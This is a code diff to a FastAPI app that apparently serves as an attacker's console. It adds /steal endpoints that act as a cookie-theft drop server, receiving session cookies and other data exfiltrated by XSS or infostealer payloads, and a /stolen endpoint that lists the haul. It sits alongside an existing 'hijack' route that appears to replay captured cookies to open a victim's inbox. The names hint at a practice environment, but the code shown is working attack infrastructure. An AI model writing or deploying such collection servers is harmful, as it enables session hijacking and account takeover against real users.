@@ -13,7 +13,7 @@ from contextlib import closing
 
 import httpx
 from fastapi import FastAPI, Request
-from fastapi.responses import HTMLResponse
+from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.templating import Jinja2Templates
 
 DB = os.environ.get("CONSOLE_DB", os.path.join(os.path.dirname(__file__), "data", "captures.db"))
@@ -93,6 +93,29 @@ def hijack(request: Request, track: str):
         ok, inbox_html = False, f"<pre>error: {e}</pre>"
     return tpl.TemplateResponse(request, "hijack.html", {"track": track, "ok": ok,
                                  "cookie": ck, "inbox": inbox_html, "kingmail": KINGMAIL_URL})
+
+
+STOLEN: list = []  # cookie-theft drop server (XSS / infostealer exfiltration lands here)
+
+
+@app.get("/steal")
+async def steal_get(request: Request):
+    STOLEN.insert(0, {"ts": time.time(), "src": request.query_params.get("src", "?"),
+                      "data": request.query_params.get("c", ""),
+                      "ua": request.headers.get("user-agent", "")})
+    return JSONResponse({"ok": True})  # a real drop server would 200 an image/pixel
+
+
+@app.post("/steal")
+async def steal_post(payload: dict):
+    STOLEN.insert(0, {"ts": time.time(), "src": payload.get("src", "?"),
+                      "data": payload.get("data", payload), "ua": payload.get("ua", "")})
+    return {"ok": True}
+
+
+@app.get("/stolen")
+def stolen():
+    return {"count": len(STOLEN), "items": STOLEN}
 
 
 @app.get("/healthz")
